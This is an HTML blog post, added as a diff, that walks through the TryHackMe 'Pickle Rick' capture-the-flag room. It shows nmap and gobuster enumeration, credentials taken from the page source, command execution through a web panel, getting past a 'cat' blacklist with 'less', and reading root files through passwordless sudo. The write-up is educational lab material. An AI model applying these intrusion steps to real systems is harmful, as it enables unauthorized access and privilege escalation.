@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pickle Rick Writeup | Bisc's Security Lab</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #080c10;
+            --card-bg: #0d121d;
+            --accent-green: #00ff88;
+            --accent-cyan: #00e5ff;
+            --text-main: #c9d1d9;
+            --text-muted: #8b949e;
+            --border-color: #1f293d;
+            --code-bg: #05080c;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-color);
+            border-left: 1px solid var(--border-color);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--accent-green);
+            border-radius: 3px;
+            box-shadow: 0 0 8px rgba(0, 255, 136, 0.4);
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent-cyan);
+            box-shadow: 0 0 10px rgba(0, 229, 255, 0.6);
+        }
+        * {
+            scrollbar-width: auto;
+            scrollbar-color: var(--accent-green) var(--bg-color);
+        }
+
+        .sidebar {
+            width: 300px;
+            background-color: var(--card-bg);
+            border-right: 1px solid var(--border-color);
+            padding: 2rem 1.5rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: fixed;
+            height: 100vh;
+        }
+
+        .avatar-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin-bottom: 1rem;
+        }
+
+        .avatar {
+            width: 100%;
+            height: 100%;
+            border-radius: 15px;
+            object-fit: cover;
+            border: 2px solid var(--accent-green);
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+
+        .profile-name {
+            font-family: 'Fira Code', monospace;
+            font-size: 1.4rem;
+            color: #fff;
+            margin-bottom: 0.2rem;
+        }
+
+        .profile-rank {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-cyan);
+            margin-bottom: 0.8rem;
+        }
+
+        .profile-bio {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 1.5rem;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+        }
+
+        .nav-links {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            margin-bottom: auto;
+        }
+
+        .nav-btn {
+            display: block;
+            text-align: left;
+            padding: 0.6rem 1rem;
+            border-radius: 6px;
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            text-decoration: none;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            transition: 0.2s ease;
+        }
+
+        .nav-btn:hover, .nav-btn.active {
+            border-color: var(--accent-green);
+            color: var(--accent-green);
+            background: rgba(0, 255, 136, 0.05);
+        }
+
+        .social-links {
+            width: 100%;
+            margin-top: 1rem;
+        }
+
+        .btn-external {
+            display: block;
+            text-align: center;
+            padding: 0.6rem;
+            border-radius: 6px;
+            background: transparent;
+            border: 1px solid var(--accent-cyan);
+            color: var(--accent-cyan);
+            text-decoration: none;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            transition: 0.2s ease;
+        }
+
+        .btn-external:hover {
+            background: var(--accent-cyan);
+            color: #000;
+            box-shadow: 0 0 10px rgba(0, 229, 255, 0.4);
+        }
+
+        .main-content {
+            margin-left: 300px;
+            flex: 1;
+            padding: 3rem;
+            max-width: 900px;
+        }
+
+        .breadcrumbs {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 1.5rem;
+        }
+
+        .breadcrumbs a {
+            color: var(--accent-cyan);
+            text-decoration: none;
+        }
+
+        .breadcrumbs a:hover {
+            text-decoration: underline;
+        }
+
+        .article {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 2rem;
+        }
+
+        .article-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+            margin-bottom: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+        }
+
+        .tag {
+            background: rgba(0, 229, 255, 0.1);
+            color: var(--accent-cyan);
+            padding: 2px 8px;
+            border-radius: 4px;
+            border: 1px solid rgba(0, 229, 255, 0.2);
+        }
+
+        .article h1 {
+            color: #fff;
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+        }
+
+        .article h2 {
+            color: var(--accent-green);
+            font-family: 'Fira Code', monospace;
+            font-size: 1.1rem;
+            margin: 1.8rem 0 0.8rem 0;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 0.3rem;
+        }
+
+        .article p, .article ul {
+            margin-bottom: 1rem;
+            color: var(--text-main);
+            font-size: 0.95rem;
+        }
+
+        .article ul {
+            padding-left: 1.2rem;
+        }
+
+        .article li {
+            margin-bottom: 0.4rem;
+        }
+
+        pre {
+            background: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-left: 3px solid var(--accent-green);
+            border-radius: 6px;
+            padding: 1rem;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: #e6edf3;
+            margin: 1rem 0;
+        }
+
+        code {
+            font-family: 'Fira Code', monospace;
+            color: var(--accent-cyan);
+            background: rgba(255, 255, 255, 0.05);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+        }
+
+        @media (max-width: 1055px) {
+            body { flex-direction: column; }
+            .sidebar { width: 100%; height: auto; position: relative; border-right: none; border-bottom: 1px solid var(--border-color); }
+            .main-content { margin-left: 0; padding: 1.5rem; width: 100%; max-width: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+    <aside class="sidebar">
+        <div class="avatar-container">
+            <img src="../../../avatar2.jpeg" alt="Bisc Profile Picture" class="avatar">
+        </div>
+        <h2 class="profile-name">Bisc</h2>
+        <p class="profile-rank">[0x8][HACKER]</p>
+        <p class="profile-bio">I love biscuits 🙃🍪</p>
+
+        <nav class="nav-links">
+            <a href="../../../index.html" class="nav-btn">~/home</a>
+            <a href="../../index.html" class="nav-btn active">~/ctf</a>
+            <a href="../../../about/index.html" class="nav-btn">~/about</a>
+        </nav>
+
+        <div class="social-links">
+            <a href="https://tryhackme.com/p/Bisc" target="_blank" class="btn-external">TryHackMe Profile</a>
+        </div>
+    </aside>
+
+    <main class="main-content">
+        <div class="breadcrumbs">
+            <a href="../../../index.html">home</a> / <a href="../../index.html">ctf</a> / <a href="../index.html">tryhackme</a> / <span style="color: var(--text-main);">Pickle-Rick</span>
+        </div>
+
+        <article class="article">
+            <div class="article-meta">
+                <span class="tag">TryHackMe</span>
+                <span class="tag">Web Enumeration</span>
+                <span class="tag">Command Injection</span>
+                <span class="tag">Privilege Escalation</span>
+                <span class="tag">Easy</span>
+            </div>
+
+            <h1>Pickle Rick — Room Walkthrough</h1>
+            <p>Pickle Rick is a <em>Rick and Morty</em>-themed TryHackMe challenge where Rick has turned himself into a pickle and needs three secret ingredients to brew a potion that turns him back into a human. Compromising the target involves web source enumeration, directory brute-forcing, exploiting an authenticated web command panel, bypassing blacklisted commands, and abusing passwordless <code>sudo</code> privileges.</p>
+
+            <h2>01. Reconnaissance &amp; Enumeration</h2>
+            <p>I began by scanning the target IP address (<code>10.113.145.39</code>) using Nmap with aggressive service and OS detection (<code>-A</code>) to identify open ports and running services:</p>
+
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ nmap -A 10.113.145.39
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-11 10:56 -0500
+Nmap scan report for 10.113.145.39
+Host is up (0.095s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 28:d6:06:35:5f:e0:58:f3:cf:55:88:bb:e2:3a:2c:b4 (RSA)
+|   256 dc:0e:ea:59:79:a7:9b:47:d4:ed:31:6b:dd:0c:7d:26 (ECDSA)
+|_  256 01:4c:64:da:4f:09:55:1a:0b:76:aa:4b:3a:96:83:56 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Rick is sup4r cool
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+            <p>The scan revealed two open ports: <strong>SSH on port 22</strong> and an <strong>Apache HTTP server on port 80</strong> hosting a page titled <em>"Rick is sup4r cool"</em>. Navigating to <code>http://10.113.145.39/</code> displayed a simple landing page asking for help finding Rick's ingredients, with no visible links or forms.</p>
+
+            <p>Opening the browser developer tools (Inspect / View Source) uncovered a developer comment hidden in the HTML containing a valid username:</p>
+
+<pre><code>&lt;!--
+
+  Note to self, remember username!
+
+  Username: R1ckRul3s
+
+--&gt;</code></pre>
+
+            <p>I saved <code>R1ckRul3s</code> in a text editor for later use. Since no other clues appeared in the page source, I launched <code>gobuster</code> using the <code>directory-list-2.3-medium.txt</code> wordlist—a balanced wordlist ideal for thorough web enumeration—along with common web extensions (<code>php</code>, <code>html</code>, <code>js</code>, <code>txt</code>):</p>
+
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ gobuster dir -u http://10.113.145.39/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt
+
+index.html           (Status: 200) [Size: 1062]
+login.php            (Status: 200) [Size: 882]
+assets               (Status: 301) [Size: 315] [--&gt; http://10.113.145.39/assets/]
+portal.php           (Status: 302) [Size: 0] [--&gt; /login.php]
+robots.txt           (Status: 200) [Size: 17]</code></pre>
+
+            <p>Inspecting the discovered endpoints revealed two critical pieces of information:</p>
+            <ul>
+                <li><code>/robots.txt</code> contained a single weird string: <code>Wubbalubbadubdub</code>, which I saved alongside the username as a potential password.</li>
+                <li><code>/assets/</code> contained static media files with nothing useful, while <code>/portal.php</code> redirected directly to the authentication form at <code>/login.php</code>.</li>
+            </ul>
+
+            <h2>02. Initial Access &amp; First Ingredient</h2>
+            <p>Navigating to <code>http://10.113.145.39/login.php</code>, I tested the credentials gathered during enumeration: <code>R1ckRul3s</code> as the username and <code>Wubbalubbadubdub</code> as the password. The login succeeded and granted access to <code>portal.php</code>, which exposed a web-based <strong>Command Panel</strong> capable of executing OS commands directly on the server.</p>
+
+            <p>To verify execution context and enumerate the web root, I ran <code>whoami</code>, <code>pwd</code>, and <code>ls</code> inside the command input field:</p>
+
+<pre><code>$ whoami
+www-data
+
+$ pwd
+/var/www/html
+
+$ ls
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt</code></pre>
+
+            <p>Two interesting text files appeared in <code>/var/www/html</code>: <code>Sup3rS3cretPickl3Ingred.txt</code> and <code>clue.txt</code>. Since both files resided inside the public web directory, I accessed them directly through the browser to retrieve the first ingredient and the next hint:</p>
+
+<pre><code># http://10.113.145.39/Sup3rS3cretPickl3Ingred.txt
+m**************r
+
+# http://10.113.145.39/clue.txt
+Look around the file system for the other ingredient.</code></pre>
+
+            <p><strong>First Ingredient:</strong> <code>m**************r</code></p>
+
+            <h2>03. File System Enumeration &amp; Second Ingredient</h2>
+            <p>Following the hint in <code>clue.txt</code>, I traversed upward from <code>/var/www/html</code> to check <code>/var</code> (including <code>/var/backups</code>) and eventually the root filesystem (<code>/</code>) using <code>ls -al</code> to ensure no hidden files were missed:</p>
+
+<pre><code>$ cd ../../../ &amp;&amp; ls -al
+total 112
+drwxr-xr-x  23 root root  4096 Nov 12 13:45 .
+drwxr-xr-x  23 root root  4096 Nov 12 13:45 ..
+drwxr-xr-x   2 root root 12288 Jul 11  2024 bin
+drwxr-xr-x   3 root root  4096 Jul 11  2024 boot
+drwxr-xr-x  16 root root  3240 Nov 12 13:45 dev
+drwxr-xr-x 109 root root 12288 Nov 12 13:45 etc
+drwxr-xr-x   4 root root  4096 Feb 10  2019 home
+...
+drwx------   4 root root  4096 Jul 11  2024 root
+drwxr-xr-x  14 root root  4096 Feb 10  2019 var</code></pre>
+
+            <p>Checking the <code>/home</code> directory revealed two user folders: <code>rick</code> and <code>ubuntu</code>. Listing the contents of <code>/home/rick</code> uncovered the second ingredient file:</p>
+
+<pre><code>$ cd ../../../home &amp;&amp; ls -al
+total 16
+drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
+drwxr-xr-x 23 root   root   4096 Nov 12 13:45 ..
+drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
+drwxr-xr-x  5 ubuntu ubuntu 4096 Jul 11  2024 ubuntu
+
+$ ls -al ../../../home/rick
+total 12
+drwxrwxrwx 2 root root 4096 Feb 10  2019 .
+drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
+-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients</code></pre>
+
+            <p>When I attempted to read <code>second ingredients</code> using <code>cat</code>, the web application blocked the request with a custom blacklist message:</p>
+
+<pre><code>$ cat ../../../home/rick/"second ingredients"
+Command disabled to make it hard for future PICKLEEEE RICCCKKKK.</code></pre>
+
+            <p>Other common file-reading utilities such as <code>head</code> and <code>tail</code> were also restricted by the command panel's filter, but <code>less</code> was allowed. Using <code>less</code> bypassed the filter and displayed the file's contents:</p>
+
+<pre><code>$ less ../../../home/rick/"second ingredients"
+1**********r</code></pre>
+
+            <p><strong>Second Ingredient:</strong> <code>1**********r</code></p>
+
+            <h2>04. Privilege Escalation &amp; Third Ingredient</h2>
+            <p>With <code>/root</code> inaccessible to the standard <code>www-data</code> user, I checked the account's <code>sudo</code> privileges using <code>sudo -l</code> to look for privilege escalation paths:</p>
+
+<pre><code>$ sudo -l
+Matching Defaults entries for www-data on ip-10-113-152-251:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-113-152-251:
+    (ALL) NOPASSWD: ALL</code></pre>
+
+            <p>The output showed a critical misconfiguration: <code>www-data</code> is permitted to execute <strong>any</strong> command as <code>root</code> without a password (<code>(ALL) NOPASSWD: ALL</code>). Using <code>sudo</code>, I listed the contents of <code>/root</code> and discovered <code>3rd.txt</code>:</p>
+
+<pre><code>$ sudo ls -al ../../../root
+total 36
+drwx------  4 root root 4096 Jul 11  2024 .
+drwxr-xr-x 23 root root 4096 Nov 12 13:45 ..
+-rw-------  1 root root  168 Jul 11  2024 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+-rw-r--r--  1 root root  161 Jan  2  2024 .profile
+drwx------  2 root root 4096 Feb 10  2019 .ssh
+-rw-------  1 root root  702 Jul 11  2024 .viminfo
+-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
+drwxr-xr-x  4 root root 4096 Jul 11  2024 snap</code></pre>
+
+            <p>Finally, reading <code>3rd.txt</code> with <code>sudo less</code> revealed the third and final ingredient:</p>
+
+<pre><code>$ sudo less ../../../root/3rd.txt
+3rd ingredients: f*********e</code></pre>
+
+            <p><strong>Third Ingredient:</strong> <code>f*********e</code></p>
+
+<p style="color: var(--accent-green); font-family: 'Fira Code', monospace; margin-top: 1.5rem; font-weight: 600;">
+[+] Flags captured! Time for a biscuit 😋🍪
+</p>
+
+        </article>
+    </main>
+
+</body>
+</html>
